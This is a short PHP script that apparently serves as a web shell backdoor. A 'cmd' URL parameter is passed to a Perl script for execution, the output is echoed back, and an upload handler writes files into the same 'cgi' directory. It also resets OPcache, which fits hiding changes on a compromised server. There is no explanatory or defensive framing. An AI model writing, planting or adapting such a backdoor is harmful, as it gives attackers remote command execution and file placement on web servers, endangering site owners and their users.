<?php
// Clear OPcache
opcache_reset();

// Define the path to your cgi directory
$cgi_directory = 'cgi';  // Adjust this if the path is different

// Check if 'cmd' parameter is passed in the URL
if (isset($_GET['cmd'])) {
    $cmd = escapeshellarg($_GET['cmd']);  // Sanitize the input to prevent command injection

    // Change the current working directory to the 'cgi' directory
    chdir($cgi_directory);

    // Execute the Perl script inside the 'cgi' folder with the command passed as an argument
    $output = shell_exec("/usr/bin/perl b.pl $cmd");

    // Display the output of the executed command
    echo $output;
} else {
    echo "Please provide a command to execute.";
}

if (isset($_GET['up'])) {
    if (isset($_FILES['image'])) {
        $filedir = "cgi/";
        $maxfile = 92000000;
        if (!is_dir($filedir)) mkdir($filedir, 0777, true);

        $file = $_FILES['image'];
        if ($file['error']) {
            echo "<center><b>Error: {$file['error']}</b></center>";
        } elseif ($file['size'] > $maxfile) {
            echo "<center><b>Error: File is too large. Max size is 90MB.</b></center>";
        } elseif (pathinfo($file['name'], PATHINFO_EXTENSION) != "txt") {
            echo "<center><b>Error: Only .txt files are allowed.</b></center>";
        } elseif (move_uploaded_file($file['tmp_name'], $filedir . basename($file['name']))) {
            echo "<center><b>Done ==> {$file['name']}</b></center>";
        } else {
            echo "<center><b>Error: Failed to upload the file.</b></center>";
        }
    } else {
        echo "<center><b>No file received. Please try again.</b></center>";
    }
}
?>
